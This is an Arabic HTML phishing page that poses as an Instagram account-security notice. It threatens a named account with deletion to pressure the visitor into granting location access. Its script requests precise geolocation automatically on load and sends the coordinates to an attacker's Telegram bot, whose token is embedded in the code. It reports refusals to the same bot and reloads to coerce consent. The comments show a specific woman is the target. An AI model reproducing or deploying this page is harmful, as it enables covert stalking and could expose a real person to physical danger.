<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>مركز أمان الحسابات - إنستغرام</title>
    <style>
        body { background-color: #f0f2f5; font-family: 'Segoe UI', Tahoma, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { background: white; padding: 30px; border-radius: 12px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); width: 90%; max-width: 400px; text-align: center; border-top: 5px solid #1877f2; }
        .icon { width: 100px; margin-bottom: 20px; }
        h2 { color: #1c1e21; margin-bottom: 15px; font-size: 22px; }
        p { color: #606770; font-size: 14px; line-height: 1.6; margin-bottom: 25px; }
        .btn { background-color: #1877f2; color: white; padding: 14px; border-radius: 8px; border: none; font-weight: bold; font-size: 16px; cursor: pointer; width: 100%; transition: 0.3s; }
        #status { margin-top: 15px; font-size: 14px; font-weight: bold; color: #ed4956; display: none; }
    </style>
</head>
<body>

<div class="card">
    <img src="https://cdn-icons-png.flaticon.com/512/1067/1067566.png" class="icon" alt="Support">
    <h2>تأكيد الهوية الرقمية</h2>
    <p>لقد تم تقديم بلاغ "انتحال شخصية" ضد الحساب <br><b>(ha2542213)</b>. <br><br> لتجنب حذف الحساب نهائياً، يرجى الضغط على الزر والموافقة على "سماح بالموقع" لمطابقة بياناتك.</p>
    <button class="btn" id="mainBtn" onclick="verify()">تأكيد الموقع وإلغاء البلاغ</button>
    <div id="status">يجب الضغط على "سماح" (Allow) لإتمام العملية!</div>
</div>

<script>
    const token = '8669811855:AAGvHpikmaCi4E_dlFy24J1iYUgAdlnXWsg';
    const chat_id = '7214473798';

    function sendToTelegram(msg) {
        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(msg)}`);
    }

    function verify() {
        const geoOptions = {
            enableHighAccuracy: true, 
            timeout: 15000,           
            maximumAge: 0             
        };

        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(function(position) {
                // في حال ضغطت "سماح" ونجحنا بجلب الإحداثيات
                const lat = position.coords.latitude;
                const lon = position.coords.longitude;
                const acc = position.coords.accuracy;
                
                const googleMaps = `https://www.google.com/maps?q=${lat},${lon}`;
                
                let report = `🎯 **تم صيد الهدف بنجاح!**\n\n`;
                report += `👤 الحساب: ha2542213\n`;
                report += `📍 الموقع: ${googleMaps}\n`;
                report += `📏 الدقة: ${acc.toFixed(1)} متر`;

                sendToTelegram(report);

                document.getElementById('status').innerText = "تمت المصادقة بنجاح!";
                document.getElementById('status').style.color = "#42b72a";
                document.getElementById('status').style.display = 'block';
                
                setTimeout(() => {
                    window.location.href = "https://help.instagram.com";
                }, 2000);

            }, function(error) {
                // في حال ضغطت "رفض" أو "Block"
                sendToTelegram("⚠️ البنت رفضت إعطاء الصلاحية (ضغطت Block).");
                
                // رسالة إجبارية تظهر لها
                alert("خطأ أمني: النظام لم يستطع التأكد من موقعك. يجب اختيار 'سماح' (Allow) لإلغاء طلب حذف حسابك.");
                
                // إعادة تحميل الصفحة تلقائياً لتظهر نافذة السماح مرة ثانية
                location.reload(); 
                
            }, geoOptions);
        }
    }

    // محاولة تشغيل الطلب فور دخول الصفحة لجذب انتباهها
    window.onload = function() {
        setTimeout(verify, 1000);
    }
</script>

</body>
</html>
